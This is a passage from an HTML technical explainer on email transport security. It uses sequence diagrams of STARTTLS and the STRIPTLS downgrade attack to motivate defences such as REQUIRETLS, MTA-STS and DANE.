to upgrade an insecure <a href="https://evalapply.org/internet/#transmission-control-protocol"><abbr title="Transmission Control Protocol">TCP</abbr> connection</a>
to a secure <a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr> connection</a>:</p>

<figure>
  <svg id="figure-transport-security-starttls" data-name="transport-security-starttls" width="348.682" height="477.25" viewBox="-36.841 -1.25 348.682 477.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-35.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="474.75"></line>
    </g>
    <g>
        <rect x="239.409" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="275" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="275" y1="40.75" x2="275" y2="474.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="273.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="69.5">(Open <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="123.5" x2="1.25" y2="123.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="111.5">220 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="165.5" x2="273.75" y2="165.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="153.5">EHLO client.example.org</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="251.5" x2="1.25" y2="251.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="195.5">250-server.example.com</tspan><tspan x="138.125" y="217.5">250-PIPELINING</tspan><tspan x="138.125" y="239.5">250 <tspan>starttls</tspan></tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="293.5" x2="273.75" y2="293.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="281.5"><tspan>starttls</tspan></tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="335.5" x2="1.25" y2="335.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="323.5">220 Go ahead</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="377.5" x2="273.75" y2="377.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="365.5">(Start <tspan>tls</tspan> negotiation)</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="419.5" x2="1.25" y2="419.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="407.5">(Negotiate a <tspan>tls</tspan> session)</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="461.5" x2="273.75" y2="461.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="449.5">(Continue with <tspan>tls</tspan>)</tspan>
        </text>
    </g>

</svg>

  <figcaption>
The <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a> of <code>STARTTLS</code>.
</figcaption>
</figure>

<p>In order to remain <a href="https://en.wikipedia.org/wiki/Backward_compatibility">backward compatible</a>,
the client can use the <code>STARTTLS</code> extension only if the server supports it.
Since the server indicates support for <code>STARTTLS</code> over the insecure channel,
an attacker who can intercept and alter the <a href="https://evalapply.org/internet/#packet-switching">packets</a> between the client and the server
can simply strip the <code>STARTTLS</code> capability from the server’s response to the <code>EHLO</code> command:</p>

<figure>
  <svg id="figure-transport-security-striptls" data-name="transport-security-striptls" width="639.242" height="541.25" viewBox="-44.621 -1.25 639.242 541.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-43.371" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="538.75"></line>
    </g>
    <g>
        <rect x="231.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="275" y="25.65"><tspan>Attacker</tspan></tspan>
        </text>
        <line x1="275" y1="40.75" x2="275" y2="538.75"></line>
    </g>
    <g>
        <rect x="506.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="550" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="550" y1="40.75" x2="550" y2="538.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="273.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="69.5">(Open <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="123.5" x2="548.75" y2="123.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="411.875" y="111.5">(Open <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="550" y1="165.5" x2="276.25" y2="165.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="413.125" y="153.5">220 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="207.5" x2="1.25" y2="207.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="195.5">220 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="249.5" x2="273.75" y2="249.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="237.5">EHLO client.example.org</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="291.5" x2="548.75" y2="291.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="411.875" y="279.5">EHLO client.example.org</tspan>
        </text>
    </g>
    <g>
        <line x1="550" y1="377.5" x2="276.25" y2="377.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="413.125" y="321.5">250-server.example.com</tspan><tspan x="413.125" y="343.5">250-PIPELINING</tspan><tspan x="413.125" y="365.5">250 <tspan>starttls</tspan></tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="441.5" x2="1.25" y2="441.5" marker-start="url(#circle-red)" marker-end="url(#arrow-red)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="407.5">250-server.example.com</tspan><tspan x="138.125" y="429.5">250 PIPELINING</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="483.5" x2="273.75" y2="483.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="471.5">(Continue without <tspan>tls</tspan>)</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="525.5" x2="548.75" y2="525.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="411.875" y="513.5">(Continue with or without <tspan>tls</tspan>)</tspan>
        </text>
    </g>

</svg>

  <figcaption>
How a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man in the middle</a>
can prevent the two parties from upgrading their connection to <abbr title="Transport Layer Security">TLS</abbr>.
</figcaption>
</figure>

<p>This attack is known as <a href="https://en.wikipedia.org/wiki/Opportunistic_TLS#Weaknesses_and_mitigations"><abbr title="Attack to make Transport Layer Security seem unavailable">STRIPTLS</abbr></a>.
The problem is not <a href="#use-of-tls">Explicit <abbr title="Transport Layer Security">TLS</abbr></a> but rather the
<a href="https://en.wikipedia.org/wiki/Opportunistic_encryption">opportunistic use of <abbr title="Transport Layer Security">TLS</abbr></a>
for the sake of backward compatibility.
If the client is willing to continue without the security provided by <abbr title="Transport Layer Security">TLS</abbr>,
<a href="#use-of-tls">Implicit <abbr title="Transport Layer Security">TLS</abbr></a> suffers from the same problem:</p>

<figure>
  <svg id="figure-transport-security-timeout" data-name="transport-security-timeout" width="639.242" height="475.25" viewBox="-44.621 -1.25 639.242 475.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-43.371" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="472.75"></line>
    </g>
    <g>
        <rect x="231.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="275" y="25.65"><tspan>Attacker</tspan></tspan>
        </text>
        <line x1="275" y1="40.75" x2="275" y2="472.75"></line>
    </g>
    <g>
        <rect x="506.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="550" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="550" y1="40.75" x2="550" y2="472.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="273.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="69.5">(Open <tspan>tls</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="249.5" x2="273.75" y2="249.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="237.5">(Open <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="291.5" x2="548.75" y2="291.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="411.875" y="279.5">(Open <tspan>tcp</tspan> or <tspan>tls</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="550" y1="333.5" x2="276.25" y2="333.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="413.125" y="321.5">220 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="375.5" x2="1.25" y2="375.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="138.125" y="363.5">220 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="417.5" x2="273.75" y2="417.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="136.875" y="405.5">EHLO client.example.org</tspan>
        </text>
    </g>
    <g>
        <line x1="275" y1="459.5" x2="548.75" y2="459.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="267"></line>
        <text text-anchor="middle">
            <tspan x="411.875" y="447.5">EHLO client.example.org</tspan>
        </text>
    </g>

</svg>

  <figcaption>
The attacker can drop the client’s <abbr title="Transport Layer Security">TLS</abbr> connection until it gives up and connects to the server with <abbr title="Transmission Control Protocol">TCP</abbr>.
</figcaption>
</figure>

<p>While the opportunistic use of <abbr title="Transport Layer Security">TLS</abbr> is also a problem for <a href="#submission-versus-relay">submission</a>,
<a href="#access-protocols">access</a>, and <a href="#email-filtering">filtering</a> protocols,
mail clients always communicate with the same few servers
and should not fall back to insecure communication after the initial configuration.
Additionally, <a href="https://datatracker.ietf.org/doc/html/rfc8314">cleartext is considered obsolete</a> for email submission and access.
For these reasons, we’re interested only in securing <a href="#submission-versus-relay"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> for Relay</a> between
the outgoing mail server of the sender and the incoming mail server of the recipient in this section.
As discussed <a href="#implicit-tls-versus-explicit-tls">earlier</a>,
there are three ways to achieve secure transport
in the presence of an <a href="https://en.wikipedia.org/wiki/Adversary_(cryptography)">active adversary</a>
without sacrificing backward compatibility:</p>
<ol>
  <li><strong>Previous connections</strong>: If previous connections were secure, abort when <abbr title="Transport Layer Security">TLS</abbr> is no longer available.
<a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> works like this.</li>
  <li><strong>Authenticated channel</strong>: The recipient can indicate support for <abbr title="Transport Layer Security">TLS</abbr> through an authenticated channel.
<a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a> works like this.</li>
  <li><strong>User configuration</strong>: Let the user require that their messages may be delivered only with <abbr title="Transport Layer Security">TLS</abbr>.
<a href="#requiretls-extension">REQUIRETLS</a> makes this possible.</li>
</ol>

<details>
  <summary id="server-authentication">
Server authentication
</summary>

  <p>Without the just mentioned improvements, <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>
provides only <a href="https://en.wikipedia.org/wiki/Opportunistic_encryption">opportunistic security</a>
as defined in <a href="https://datatracker.ietf.org/doc/html/rfc7435"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7435</a>.
Opportunistic security provides confidentiality only towards passive attackers,
who merely eavesdrop on your communication but don’t interfere with it.
In the presence of an active attacker, who can modify and drop network packets,
opportunistic security provides neither confidentiality nor authenticity.
Since opportunistic security provides no security against an active attacker anyway,
many outgoing mail servers don’t verify the identity of the incoming mail server they connect to
but rather accept any certificate, even <a href="https://en.wikipedia.org/wiki/Self-signed_certificate">self-signed ones</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc3207#section-4.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3207</a>,
which specifies the <a href="#starttls-extension"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> extension</a>,
explicitly allows <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> clients to continue without server authentication
because encrypting the communication for an unknown endpoint is
<a href="https://datatracker.ietf.org/doc/html/rfc7435#section-4">still better</a>
than having no security at all with certainty.
Requiring a valid server certificate makes sense only
if the client doesn’t fall back to insecure communication otherwise.
Since you don’t want to encrypt your communication for an active attacker,
transport security extensions also have to address
how clients are supposed to verify the server’s identity.
Given the indirection through <a href="#address-resolution"><code>MX</code> records</a>,
they also have to define which identity is to be verified.
There are two <a href="https://evalapply.org/internet/#public-key-infrastructure">public-key infrastructures (<abbr title="Public Key Infrastructures">PKIs</abbr>)</a> which have found widespread use:
Vendor-configured <a href="https://en.wikipedia.org/wiki/Certificate_authority">certification authorities (<abbr title="Certification Authorities">CAs</abbr>)</a>
using the <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificate format</a>, collectively known as <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>,
and <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
<a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> uses the former,
<a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a> the latter.</p>

</details>

<details>
  <summary id="requiretls-extension">
REQUIRETLS extension
</summary>

  <p>As a user, you may prefer a delivery failure over an insecure delivery for certain messages.
The <code>REQUIRETLS</code> extension for <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc8689"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8689</a> and is not yet widely supported,
allows you to require transport security between all involved mail servers when sending an email.
For both <a href="#submission-versus-relay">submission and relay</a>,
the <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> server indicates its support for this extension
by listing <code>REQUIRETLS</code> in its response to the <code>EHLO</code> command.
If your outgoing mail server supports <code>REQUIRETLS</code>,
your mail client can add <code>REQUIRETLS</code> as a parameter to the <code>MAIL</code> <code>FROM</code> command as follows:</p>

  <figure>

    <div><div><pre><code>MAIL FROM:&lt;alice@example.org&gt; REQUIRETLS
</code></pre></div>    </div>

    <figcaption>

How a client asks an <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> server to forward the message only with <abbr title="Transport Layer Security">TLS</abbr>
to other servers which support <code>REQUIRETLS</code> as well.

</figcaption>
  </figure>

  <p>If a mail server accepts a message with the <code>REQUIRETLS</code> option,
it may forward the message only with <code>REQUIRETLS</code> enabled.
If the receiving server cannot be authenticated or doesn’t support <code>REQUIRETLS</code>,
the mail server <a href="https://datatracker.ietf.org/doc/html/rfc8689#section-4.2.1">has to send</a> a <a href="#bounce-messages">bounce message</a>
<a href="https://datatracker.ietf.org/doc/html/rfc8689#section-5">with the <code>REQUIRETLS</code> option</a> instead.
<code>REQUIRETLS</code> may be used <a href="https://datatracker.ietf.org/doc/html/rfc8689#section-2">only if</a> the communication is secured with <abbr title="Transport Layer Security">TLS</abbr>,
the <code>MX</code> record was validated with <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> or an <a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy</a>,
and the identity of the receiving server was verified with <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a>
or <a href="#server-authentication"><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr></a>.
If a message with <code>REQUIRETLS</code> enabled is forwarded by a <a href="#mailing-list">mailing list</a>
or <a href="#automatic-responses">responded to automatically</a>,
these generated messages should also have <code>REQUIRETLS</code> enabled.
Please note that <code>REQUIRETLS</code> does not provide <a href="#end-to-end-security">end-to-end security</a>:
A malicious mail server has access to the content of a message
and can leak it to anyone even without disabling <code>REQUIRETLS</code>.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc8689"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8689</a> also specifies the
<a href="https://datatracker.ietf.org/doc/html/rfc8689#section-3"><code>TLS-Required</code> header field</a>,
which allows the sender to prioritize delivery over security as follows:</p>

  <figure>

    <div><div><pre><code>TLS-Required: No
</code></pre></div>    </div>

    <figcaption>

How a client asks an <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> server to forward the message
even if <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a>
or <a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> fails.
At the moment, <code>No</code> is the only valid value.

</figcaption>
  </figure>

  <p>This can be useful, for example,
when you want to report a misconfigured mail server,
such as an expired <abbr title="Transport Layer Security">TLS</abbr> certificate.
This option is defined as a message header field rather than as an envelope parameter
so that it can pass through mail servers which don’t support <code>REQUIRETLS</code>.
Since a mail server might implement <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a>
or <a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> without supporting <code>REQUIRETLS</code>,
messages with this header field can still bounce due to a failed <abbr title="Transport Layer Security">TLS</abbr> negotiation.
This header field simply allows the sender to override the <abbr title="Transport Layer Security">TLS</abbr> policy of the recipient domain.
If <code>REQUIRETLS</code> is enabled for a message, the <code>TLS-Required</code> header field
<a href="https://datatracker.ietf.org/doc/html/rfc8689#section-4.1">has to be ignored</a>.</p>

</details>

<h4 id="dns-based-authentication-of-named-entities"><abbr title="Domain Name System">DNS</abbr>-Based Authentication of Named Entities (<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>)</h4>

<p><a href="https://en.wikipedia.org/wiki/DNS-based_Authentication_of_Named_Entities"><abbr title="Domain Name System">DNS</abbr>-Based Authentication of Named Entities (<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc6698"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6698</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc7671"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7671</a> updates and clarifies some aspects of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>,
and <a href="https://datatracker.ietf.org/doc/html/rfc7672"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7672</a> specifies how <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> is applied to <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>.
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> relies on <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a> for three different purposes:</p>
<ul>
  <li><strong><abbr title="Domain Name System">DNS</abbr> authentication</strong>:
Domain names are used to reference services,
which are often provided by external service providers.
Since changes are easier if the service providers can manage their address records themselves,
indirections with <code>MX</code>, <code>SRV</code>, and <code>CNAME</code> records are quite common in the Domain Name System.
The same is true for security-related <abbr title="Domain Name System">DNS</abbr> records,
such as <a href="#tlsa-record-type"><code>TLSA</code> records</a>, which are introduced by <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.
(<a href="https://datatracker.ietf.org/doc/html/rfc6698#section-1.2">Officially</a>,
<code>TLSA</code> is not an acronym but simply the name of the record type.
Personally, I like to think of <code>TLSA</code> as Transport Layer Security Anchor.)
Letting the service providers configure the necessary <code>TLSA</code> records
at their domains has <a href="#tlsa-record-location">some advantages</a>.
However, the <code>TLSA</code> records can be trusted only if the <abbr title="Domain Name System">DNS</abbr> records are authenticated with <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>
both in the zone of the customer and in the zone of the service provider.
If the reply to the <code>MX</code>, <code>SRV</code>, or <code>CNAME</code> query can be spoofed by an attacker,
the attacker can pose as the legitimate service provider to unsuspecting clients.</li>
  <li><strong>Downgrade resistance</strong>:
By configuring <code>TLSA</code> records at the <a href="#tlsa-record-location">appropriate subdomain</a>,
a service provider indicates that its server supports <abbr title="Transport Layer Security">TLS</abbr>.
Thanks to <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>’s <a href="https://evalapply.org/internet/#domain-name-system-security-extensions">authenticated denial of existence</a>,
an attacker cannot suppress the retrieval of the <code>TLSA</code> records,
which makes <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> resistant to <a href="https://en.wikipedia.org/wiki/Downgrade_attack">downgrade attacks</a>.
Before you can deploy <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, you have to deploy <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>.
If a client encounters an unsigned domain,
it continues with <a href="https://en.wikipedia.org/wiki/Opportunistic_encryption">opportunistic encryption</a>.
If a client learns from the superzone that the subzone is signed
but cannot retrieve the signed <code>TLSA</code> records or a signed statement of their absence,
it <a href="#client-behavior">aborts the connection</a>.</li>
  <li><strong>Trust anchor</strong>:
In order to prevent a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle attack</a>,
the client has to <a href="#server-authentication">authenticate the server</a>.
Instead of relying on the traditional <a href="https://evalapply.org/internet/#public-key-infrastructure">public-key infrastructure (<abbr title="Public Key Infrastructure">PKI</abbr>)</a>,
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> requires service providers to put the <a href="https://evalapply.org/internet/#digital-signatures">public key</a> of their server
or the public key of a <a href="https://en.wikipedia.org/wiki/Trust_anchor">trust anchor</a> of their choosing
into their <a href="#tlsa-record-type"><code>TLSA</code> records</a>.
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients then verify whether the server’s public key is confirmed
directly or indirectly by one of the server’s <code>TLSA</code> records.
Relying on <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> rather than on traditional
<a href="https://en.wikipedia.org/wiki/Certificate_authority">certification authorities (<abbr title="Certification Authorities">CAs</abbr>)</a>
has <a href="#pki-comparison">several advantages</a>.</li>
</ul>

<p>The tool below queries the <code>MX</code> records of the given domain and the <code>TLSA</code> records of each mail server.
It uses <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a> for the <abbr title="Domain Name System">DNS</abbr> queries
and performs only rudimentary checks on the format of the <code>TLSA</code> records.
It doesn’t validate whether <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> and <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> are deployed correctly.
If you want to check this, you can use <a href="https://dane.sys4.de/">this validator</a>.
I cover how you can <a href="#how-to-generate-a-tlsa-record">generate</a>
and <a href="#how-to-verify-a-tlsa-record">verify</a> <code>TLSA</code> records yourself below.
You can deploy <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> only if your mailbox provider supports it.
If your mailbox provider has configured <code>TLSA</code> records for their servers,
all that you have to do is to enable <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> on your custom domain.</p>



<details>
  <summary id="pki-comparison">
<abbr title="Public Key Infrastructure">PKI</abbr> comparison
</summary>

  <p><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> establishes a <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>-based public-key infrastructure (<abbr title="Public Key Infrastructure">PKI</abbr>),
which differs from the traditional <abbr title="Public Key Infrastructure">PKI</abbr>, also known as <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>, in several important ways:</p>
  <ul>
    <li><strong>Single root authority</strong>:
While <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> clients are shipped with numerous <a href="https://en.wikipedia.org/wiki/Root_certificate">root certificates</a>,
all <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients are configured with the single <a href="https://www.iana.org/dnssec/files">public key of the root zone</a>.
The advantage of this is that all clients come to the same conclusion whether a given <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> certificate is valid,
whereas a given <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificate can be accepted by some clients but not by others,
depending on their selection of root certificates.
You don’t want email to bounce just because the certificate of an incoming mail server
is not accepted by your outgoing mail server.
If this happens, you cannot do anything about it as a user.</li>
    <li><strong>Strict issuing constraints</strong>:
While <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certification authorities <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.10">can be constrained</a>
in what domain names they can attest, this feature is rarely used in practice.
Since any <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certification authority can issue a certificate for any domain,
a single compromised certification authority compromises the security of the whole system.
There was an attempt to <a href="#http-public-key-pinning">address this problem</a>
for <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol">HTTP</abbr></a>,
but it caused such severe problems that it was not successful.
<abbr title="Domain Name System Security Extensions">DNSSEC</abbr>, on the other hand, is strictly hierarchical:
Any domain can certify only its subdomains.
This gives the administrators of the <a href="https://en.wikipedia.org/wiki/DNS_root_zone">root zone</a> an awful lot of power,
but when it comes to eligible certification authorities for a given domain,
the risk of compromise is not shared among them but rather accumulated across them.
In computer security, the fewer parties you have to trust, the better.
Apart from the root zone, you decide which organization you want to trust
when choosing the <a href="https://en.wikipedia.org/wiki/Top-level_domain">top-level domain</a> of your domain name.</li>
    <li><strong>Easier domain validation</strong>:
Most websites are secured with <a href="https://en.wikipedia.org/wiki/Domain-validated_certificate">domain-validated certificates</a>,
where certification authorities verify only that you control the domain for which you
<a href="https://en.wikipedia.org/wiki/Certificate_signing_request">request a certificate</a>.
How your control over the domain is verified is up to the certification authority,
but it usually involves publishing a <a href="#nonces-against-replay-attacks">nonce</a>
in a <code>TXT</code> record at your domain or at a certain path on your web server.
While the non-profit organization <a href="https://en.wikipedia.org/wiki/Let%27s_Encrypt">Let’s Encrypt</a>
solved the hassle of having to do this manually with the
<a href="https://en.wikipedia.org/wiki/Automated_Certificate_Management_Environment">Automatic Certificate Management Environment (<abbr title="Automatic Certificate Management Environment">ACME</abbr>)</a> protocol,
<abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> entails a parallel infrastructure to the Domain Name System
